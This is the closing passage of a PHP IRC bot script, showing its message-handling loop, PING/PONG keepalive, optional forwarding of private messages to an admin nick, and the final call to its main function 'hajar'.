                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
       $smile = $querym[rand(0,count($querym) - 1)];
       $kata = $shouts[rand(0,count($shouts) - 1)];
       //fputs($fp,'PRIVMSG #gameku :' . $kata . ' ' . $smile . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

hajar($nick);

?>



